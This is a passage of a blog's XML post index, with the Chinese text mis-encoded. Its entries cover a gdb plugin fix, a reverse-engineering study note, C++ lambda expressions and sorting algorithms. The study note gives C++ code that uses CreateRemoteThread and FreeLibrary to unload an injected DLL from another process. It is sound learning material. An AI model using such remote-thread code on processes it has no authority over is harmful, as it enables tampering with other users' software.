            <tag> ç½‘ç»œ </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn peda from six.moves import rangeæŠ¥é”™ä¿®å¤</title>
      <link href="/posts/4aa563d5.html"/>
      <url>/posts/4aa563d5.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://windeskybb.work/archives/16df477d-d5a8-4ea5-b5f9-d3b0bde9af07">kaliç³»ç»Ÿå®‰è£…gdbåŠå…¶æ’ä»¶Peda|pwndbg|gef | å°é£é£ã®blog</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å®è·µ </tag>
            
            <tag> è®°å½• </tag>
            
            <tag> æ—¥å¸¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹08-DLLå¸è½½</title>
      <link href="/posts/382e9cc4.html"/>
      <url>/posts/382e9cc4.html</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸€ç¯‡æ‹–äº†æ¯”è¾ƒä¹…ï¼Œå› ä¸ºä¹‹å‰ä¸ç†è§£è¿›ç¨‹çš„æƒé™ä»¤ç‰Œçš„ä½œç”¨ï¼Œçœ‹é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†çš„æ—¶å€™å‘ç°æ³¨å…¥ä¸éœ€è¦æƒé™ä½†æ˜¯å¸è½½å´éœ€è¦ï¼Œä¹¦é‡Œé¢è¿˜æ²¡è¯¦ç»†è¯´ï¼Œå°±ä¸€ç›´æç½®äº†ï¼Œå‰å‡ å‘¨å­¦äº†APCæ³¨å…¥ï¼Œæ‰çŸ¥é“è¿›ç¨‹æƒé™å®Œå…¨å°±æ˜¯è¯•çš„ï¼Œå¦‚æœé‡åˆ°0x5è®¿é—®æƒé™å†²çªï¼Œé‚£å°±æå‡æƒé™å°±å¥½äº†ã€‚</p><p>ç»™äºˆvsç¼–è¯‘çš„exeé»˜è®¤è¯·æ±‚adminæƒé™</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¡¹ç›®-å±æ€§-é“¾æ¥å™¨-æ¸…å•æ–‡ä»¶-uacæ‰§è¡Œçº§åˆ«-requireAdministrator</span><br></pre></td></tr></table></figure><h2 id="DLLå¸è½½">DLLå¸è½½</h2><p>DLLä¹‹å‰æ³¨å…¥åï¼Œå†æ¬¡æ³¨å…¥å°±ä¸ä¼šè§¦å‘attchæ•ˆæœäº†ï¼Œå¦‚æœä¸æƒ³é‡å¼€è¿›ç¨‹å°±éœ€è¦å…ˆå¸è½½ä¹‹åå†æ³¨å…¥ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœæƒ³è¦è®©DLLæ‰§è¡Œå®Œä¹‹åå°±ç«‹å³å¸è½½ï¼ˆå³æ—¶æ•ˆæœï¼‰ä¹Ÿè®¸è¦å¸è½½å®ƒã€‚</p><h3 id="æµç¨‹">æµç¨‹</h3><p>æ‰¾åˆ°è¿›ç¨‹-&gt;æ‰¾è¿›ç¨‹æ¨¡å—-&gt;åŒ¹é…ç›¸åŒçš„æ¨¡å—å-&gt;æ‰§è¡ŒFreeLibrary</p><p>çœ‹ä¹¦çš„æ—¶å€™å‘ç°FreeLibraryæ²¡æœ‰Wä¸”éœ€è¦ä¼ å…¥å¯¹åº”çš„å¥æŸ„è€Œä¸æ˜¯æŒ‡é’ˆ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">Injector::isLoaded</span><span class="params">(DWORD pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hModule = <span class="literal">nullptr</span>;</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, pid);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;åˆ›å»ºå¿«ç…§å¤±è´¥&quot;</span>);</span><br><span class="line">MODULEENTRY32 me;</span><br><span class="line">me.dwSize = <span class="built_in">sizeof</span>(MODULEENTRY32);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Module32First</span>(hSnapshot, &amp;me)) &#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_wcsicmp(<span class="built_in">PathFindFileNameW</span>(DLLpath), me.szModule) &amp;&amp;</span><br><span class="line">!_wcsicmp(DLLpath, me.szExePath)) &#123;</span><br><span class="line">hModule = me.hModule;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(hSnapshot, &amp;me));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> hModule;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Injector::eject</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> pfreelibrary = (LPTHREAD_START_ROUTINE)<span class="built_in">ModuleFuncLoader</span>(<span class="string">&quot;kernel32&quot;</span>, <span class="string">&quot;FreeLibrary&quot;</span>).<span class="built_in">func</span>();</span><br><span class="line">std::string findMode;</span><br><span class="line">std::cin &gt;&gt; findMode;</span><br><span class="line"><span class="built_in">toLowerCase</span>(findMode);</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (findMode == <span class="string">&quot;pid&quot;</span>) &#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line">hProcess = <span class="built_in">findtargetHandle</span>(pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (findMode == <span class="string">&quot;name&quot;</span>) &#123;</span><br><span class="line">std::wstring name;</span><br><span class="line">std::wcin &gt;&gt; name;</span><br><span class="line">LPCWSTR lname = name.<span class="built_in">c_str</span>();</span><br><span class="line">hProcess = <span class="built_in">findtargetHandle</span>(lname);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!hProcess)</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;æ¨¡å¼åŒ¹é…å¤±è´¥&quot;</span>);</span><br><span class="line"></span><br><span class="line">DWORD pid = <span class="built_in">GetProcessId</span>(hProcess);</span><br><span class="line">HANDLE hModule = <span class="built_in">isLoaded</span>(pid);</span><br><span class="line"><span class="keyword">if</span> (hModule == INVALID_HANDLE_VALUE || hModule == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;ç›®æ ‡è¿›ç¨‹ &quot;</span> &lt;&lt; pid &lt;&lt; <span class="string">&quot; æ²¡æœ‰è¯¥æ¨¡å—&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pfreelibrary, hModule, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;è¿œç¨‹çº¿ç¨‹åˆ›å»ºå¤±è´¥&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hModule);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> DLLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPP-lambdaè¡¨è¾¾å¼</title>
      <link href="/posts/10c328b5.html"/>
      <url>/posts/10c328b5.html</url>
      
        <content type="html"><![CDATA[<h1>Lambdaè¡¨è¾¾å¼</h1><h2 id="ç”¨å¤„">ç”¨å¤„</h2><p>åœ¨é¢å‘å¯¹è±¡ä¸­ç”¨è¡¨è¾¾å¼å£°æ˜å’Œå®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œä½¿å…¶å¯ä»¥æ•è·ä¸Šå±‚å‡½æ•°çš„å˜é‡ï¼Œå®ç°é—­åŒ…ã€‚æˆ–æ˜¯å®šä¹‰åªèƒ½åœ¨æŸä¸ªå‡½æ•°ä¸­ä½¿ç”¨çš„åŒ¿åå‡½æ•°</p><h2 id="è¯­æ³•">è¯­æ³•</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[capture list] (parameter list) [mutable/<span class="keyword">exception</span>/attribute] -&gt; <span class="keyword">return</span> <span class="keyword">type</span> <span class="type">&#123; </span><span class="keyword">function</span> <span class="title">body</span> &#125;</span><br></pre></td></tr></table></figure><ul><li>capture listï¼šæ•è·åˆ—è¡¨<ul><li>å€¼æ•è·ï¼Œå®šä¹‰æ—¶ç›´æ¥ä¼ å€¼</li><li>å¼•ç”¨æ•è·ï¼Œå†…éƒ¨ä½¿ç”¨çš„æ˜¯å¯¹åº”å˜é‡çš„å¼•ç”¨</li><li>éšå¼æ•è·ï¼Œæ•è·æ‰€æœ‰å¤–éƒ¨å˜é‡ï¼Œ=è¡¨ç¤ºå€¼æ•è·ï¼Œ&amp;è¡¨ç¤ºå¼•ç”¨æ•è·</li><li>åˆå§‹åŒ–æ•è·ï¼Œæ•è·åˆ—è¡¨ä¸­å¯ä»¥å®šä¹‰å˜é‡ï¼Œä¸”å¯ä»¥è‡ªåŠ¨auto</li></ul></li><li>parameter listï¼šä¼ å…¥å‚æ•°åˆ—è¡¨ï¼ŒåŒæ™®é€šçš„å‡½æ•°</li><li>[mutable/exception/attribute]ï¼šä¸åŠ mutableä¼šè‡ªåŠ¨ç»™æŒ‰å€¼æ•è·çš„å˜é‡åŠ const</li><li>typeï¼šè¿”å›ç±»å‹ï¼Œçœç•¥åè‡ªåŠ¨æ¨å¯¼</li><li>function bodyï¼šå‡½æ•°ä½“</li></ul><h2 id="ä¸¾ä¾‹">ä¸¾ä¾‹</h2><p>è‡ªå®šä¹‰æ’åºç®—æ³•</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(arr,[](<span class="type">int</span> a,<span class="type">int</span> b)&#123;<span class="keyword">return</span> a&gt;b;&#125;);</span><br></pre></td></tr></table></figure><p>autoæ³›å‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> f = [] (<span class="keyword">auto</span> x) -&gt; <span class="keyword">auto</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_integral&lt;<span class="keyword">decltype</span>(x)&gt;::value)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (is_floating_point&lt;<span class="keyword">decltype</span>(x)&gt;::value)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•è·ç±»ä¸­çš„æˆå‘˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> func = [*<span class="keyword">this</span>]()&#123;<span class="keyword">return</span> <span class="number">2</span>*num;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/m0_60134435/article/details/136151698">æ·±å…¥æµ…å‡º C++ Lambdaè¡¨è¾¾å¼ï¼šè¯­æ³•ã€ç‰¹ç‚¹å’Œåº”ç”¨_c++ lamda å‚æ•°-CSDNåšå®¢</a></p><p>Lambdaè¡¨è¾¾å¼è™½ç„¶æ˜¯ä¸€ç§è¯­æ³•ç³–ï¼Œä½†å®ƒæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ç§å‡½æ•°å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯é‡è½½äº† <code>operator()</code> çš„ç±»çš„å¯¹è±¡ã€‚æ¯ä¸€ä¸ª Lambdaè¡¨è¾¾å¼éƒ½å¯¹åº”ä¸€ä¸ªå”¯ä¸€çš„åŒ¿åç±»ï¼Œè¿™ä¸ªç±»çš„åç§°ç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•ç›´æ¥è·å–æˆ–ä½¿ç”¨ã€‚Lambdaè¡¨è¾¾å¼çš„æ•è·åˆ—è¡¨å®é™…ä¸Šæ˜¯åŒ¿åç±»çš„æ•°æ®æˆå‘˜ï¼ŒLambdaè¡¨è¾¾å¼çš„å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹å®é™…ä¸Šæ˜¯åŒ¿åç±»çš„ <code>operator()</code> çš„å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹ï¼ŒLambdaè¡¨è¾¾å¼çš„å‡½æ•°ä½“å®é™…ä¸Šæ˜¯åŒ¿åç±»çš„ <code>operator()</code> çš„å‡½æ•°ä½“ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢çš„ Lambdaè¡¨è¾¾å¼ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">auto</span> f = [x] (<span class="type">int</span> y) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> x + y; &#125;;</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><p>ç›¸å½“äºå®šä¹‰äº†ä¸€ä¸ªåŒ¿åç±»ï¼Œç±»ä¼¼äºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">__lambda_1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    __lambda_1(<span class="type">int</span> x) : __x(x) &#123;&#125; <span class="comment">// æ„é€ å‡½æ•°ï¼Œç”¨äºåˆå§‹åŒ–æ•è·çš„å˜é‡</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="type">int</span> y)</span> <span class="type">const</span> <span class="comment">// é‡è½½çš„ operator()ï¼Œç”¨äºè°ƒç”¨ Lambdaè¡¨è¾¾å¼</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x + y; <span class="comment">// å‡½æ•°ä½“ï¼Œä¸ Lambdaè¡¨è¾¾å¼çš„å‡½æ•°ä½“ç›¸åŒ</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x; <span class="comment">// æ•°æ®æˆå‘˜ï¼Œç”¨äºå­˜å‚¨æ•è·çš„å˜é‡</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> f = __lambda_1(x); <span class="comment">// åˆ›å»ºä¸€ä¸ªåŒ¿åç±»çš„å¯¹è±¡ï¼Œç›¸å½“äº Lambdaè¡¨è¾¾å¼</span></span><br><span class="line"><span class="number">12345678910111213</span></span><br></pre></td></tr></table></figure><p>ç”±äº Lambdaè¡¨è¾¾å¼æ˜¯ä¸€ç§å‡½æ•°å¯¹è±¡ï¼Œå› æ­¤å®ƒå¯ä»¥èµ‹å€¼ç»™ä¸€ä¸ªåˆé€‚çš„å‡½æ•°æŒ‡é’ˆæˆ–å‡½æ•°å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºæ¨¡æ¿å‚æ•°ä¼ é€’ç»™ä¸€ä¸ªæ³›å‹å‡½æ•°æˆ–ç±»ã€‚</p><p>å‚è€ƒ</p><p><a href="https://zhuanlan.zhihu.com/p/150554945">ç°ä»£ C++ï¼šLambda è¡¨è¾¾å¼ - çŸ¥ä¹</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> è¯­è¨€å­¦ä¹  </category>
          
          <category> CPP </category>
          
          <category> è¯­æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> é—­åŒ… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºæœ¬æ’åºç®—æ³•</title>
      <link href="/posts/981a96f7.html"/>
      <url>/posts/981a96f7.html</url>
      
        <content type="html"><![CDATA[<h1>æ’å…¥æ’åº</h1><p>æ’å…¥æ’åºæ˜¯æŒ‡æ¯æ¬¡æ’åºçš„å…ƒç´ æ’å…¥åˆ°å·²æ’åºçš„åˆ—è¡¨ä¸­ï¼Œå’Œæ´—æ‰‘å…‹ç‰Œä¸€æ ·ã€‚å¯¹äºé¡ºåºè¡¨ï¼Œæ’å…¥æ‰€èŠ±æ—¶é—´å¾ˆå¤šã€‚</p><h2 id="ç›´æ¥æ’å…¥æ’åº">ç›´æ¥æ’å…¥æ’åº</h2><p>ä»å·¦åˆ°å³é€‰æ‹©å…ƒç´ æ’å…¥åˆ°å·²æ’åºåˆ—è¡¨ï¼Œæ’å…¥æ—¶ä¿è¯ä½¿å·²æ’åºåˆ—è¡¨ä¾ç„¶æœ‰åºã€‚åˆå§‹å·²æ’åºåˆ—è¡¨ä¸ºç©º</p><p>åŸºæœ¬ç®—æ³•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">insertionSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> j = i;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];</span><br><span class="line"><span class="keyword">while</span> (j != <span class="number">0</span> &amp;&amp; arr[j - <span class="number">1</span>] &gt; tmp) &#123;<span class="comment">//æ‰¾åˆ°è¯¥æ’å…¥çš„ä½ç½®ï¼Œå¹¶åŒæ—¶åä¸€ä¸€ä½</span></span><br><span class="line">arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = tmp;<span class="comment">//æ’å…¥</span></span><br><span class="line"><span class="built_in">pArr</span>(arr, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Container&gt;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">insertionSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(container);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container);</span><br><span class="line"><span class="keyword">if</span> (first == end) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = std::<span class="built_in">next</span>(first); i != end; i++) &#123;</span><br><span class="line"><span class="keyword">auto</span> key = *i;</span><br><span class="line"><span class="keyword">auto</span> j = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (j != first &amp;&amp; (*std::<span class="built_in">prev</span>(j) &gt; key)) &#123;</span><br><span class="line">*j = *std::<span class="built_in">prev</span>(j);</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">*j = key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00060332</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">6</span>.<span class="number">03324770</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥æ’å…¥æ’åºæœ‰ä¸¤ä¸ªå¾ªç¯ï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹æ—¶é—´å¤æ‚åº¦æ˜¯$O(n)*O(n)=O(n^2)$ï¼Œæœ€åçš„æƒ…å†µæ˜¯å®Œå…¨é€†åºï¼Œä¸å¹³å‡ç›¸åŒï¼Œæœ€å¥½æƒ…å†µä¸ºé¡ºåºï¼Œå†…å¾ªç¯ä¸éœ€è¦æ¯”è¾ƒï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸º$O(n)$<br>å¯¹äºç©ºé—´å¤æ‚åº¦ï¼Œéœ€è¦é¢å¤–ç©ºé—´å­˜æ”¾ä¸€ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥æ˜¯$O(1)$</p><h2 id="äºŒåˆ†æ’å…¥æ’åº">äºŒåˆ†æ’å…¥æ’åº</h2><p>ä¹Ÿå«æŠ˜åŠæ’å…¥æ’åºï¼Œç›´æ¥æ’å…¥æ’åºä½¿ç”¨äº†é¡ºåºæŸ¥æ‰¾ï¼Œæ•ˆç‡è¾ƒä½ï¼Œæ‰€ä»¥æŠŠé¡ºåºæŸ¥æ‰¾æ¢æˆäºŒåˆ†æŸ¥æ‰¾èƒ½æé«˜å†…å¾ªç¯æ•ˆç‡ï¼Œç„¶è€Œè¿˜æ˜¯æ’å…¥ï¼Œæ„Ÿè§‰æ²¡æœ‰æé«˜å¤šå°‘æ•ˆç‡</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">binaryInsertionSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> high = i;</span><br><span class="line"><span class="keyword">auto</span> low = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> mid = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];</span><br><span class="line"><span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">mid = (low + high) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] &lt; tmp) &#123;</span><br><span class="line">low = mid + <span class="number">1</span>;<span class="comment">//é˜²æ­¢len=2æ—¶å¡æ­»ï¼Ÿ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] &gt; tmp) &#123;</span><br><span class="line">high = mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] == tmp) &#123;</span><br><span class="line">high = low = mid;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt; low; --j)<span class="comment">//åªç§»åŠ¨</span></span><br><span class="line">&#123;</span><br><span class="line">arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">arr[low] = tmp;<span class="comment">//æ’å…¥</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pArr</span>(arr, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span 